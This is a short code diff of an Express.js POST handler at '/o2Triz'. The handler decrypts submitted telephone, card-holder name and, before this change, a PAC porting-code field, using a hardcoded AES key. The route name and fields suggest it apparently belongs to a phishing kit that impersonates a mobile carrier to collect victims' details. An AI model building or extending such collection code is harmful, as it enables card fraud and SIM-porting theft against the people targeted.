@@ -228,9 +228,6 @@ app.post("/o2Triz", (req, res) => {
   telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  pac = CryptoJS.AES.decrypt(req.body.pac, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
   ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
     CryptoJS.enc.Utf8
   );
